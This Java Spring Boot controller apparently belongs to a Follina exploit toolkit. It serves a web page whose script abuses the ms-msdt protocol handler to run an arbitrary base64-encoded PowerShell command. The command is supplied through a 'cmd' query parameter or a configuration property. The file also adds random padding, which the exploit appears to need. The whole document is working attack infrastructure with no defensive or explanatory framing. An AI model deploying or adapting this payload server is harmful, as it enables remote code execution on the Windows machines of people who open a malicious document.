package io.github.dsibilio.follina.web;

import static java.util.stream.Collectors.joining;

import java.util.Base64;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.IntStream;

import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import io.github.dsibilio.follina.config.FollinaProperties;

@RestController
@EnableConfigurationProperties(FollinaProperties.class)
public class FollinaPayloadController {

  private static final String PAYLOAD_TEMPLATE = "<script>"
      + "location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'%s'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\"\"; //%s\r\n"
      + "</script>";
  private final FollinaProperties follinaProperties;

  public FollinaPayloadController(FollinaProperties follinaProperties) {
    this.follinaProperties = follinaProperties;
  }

  /**
   * Follina payload-serving endpoint
   * 
   * @param cmd the optional dynamic payload to be passed via query param,
   *            if specified overrides the follina.payload property
   * @return the page that serves the payload
   */
  @GetMapping("/index.html")
  public String home(@RequestParam(required = false) String cmd) {
    String payload = StringUtils.hasText(cmd) ? cmd : follinaProperties.getPayload();
    return PAYLOAD_TEMPLATE.formatted(encodeToBase64(payload), randomAlphabetic(4096));
  }

  private static String encodeToBase64(String payload) {
    return Base64.getEncoder().encodeToString(payload.getBytes());
  }

  private String randomAlphabetic(int length) {
    return IntStream.range(0, length)
        .map(i -> ThreadLocalRandom.current().nextInt(26))
        .mapToObj(randomSeed -> (char) (randomSeed + 97))
        .map(randomChar -> randomChar.toString())
        .collect(joining());
  }

}
